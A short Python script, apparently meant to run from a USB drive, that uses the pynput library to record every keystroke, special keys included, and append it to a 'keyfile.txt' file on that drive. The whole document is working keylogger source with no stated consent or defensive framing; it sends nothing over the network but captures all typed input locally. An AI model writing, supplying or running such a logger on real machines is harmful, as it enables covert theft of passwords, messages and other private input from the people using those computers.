import sys
import os
from pynput import keyboard

#set log file to USB drive
usb_path = os.path.dirname(os.path.abspath(__file__))
log_file = os.path.join(usb_path, "keyfile.txt")

#ensure pynput is loaded from USB drive
sys.path.insert(0, usb_path + "\\pylibs")

def keyPressed(key):
    try: 
        with open(log_file, 'a') as logKey:
            logKey.write(key.char)
    except AttributeError: #handles special keys
        with open(log_file, 'a') as logKey:
            logKey.write(f" [{key}]")

if __name__ == "__main__":
    with keyboard.Listener(on_press=keyPressed) as listener:
        listener.join()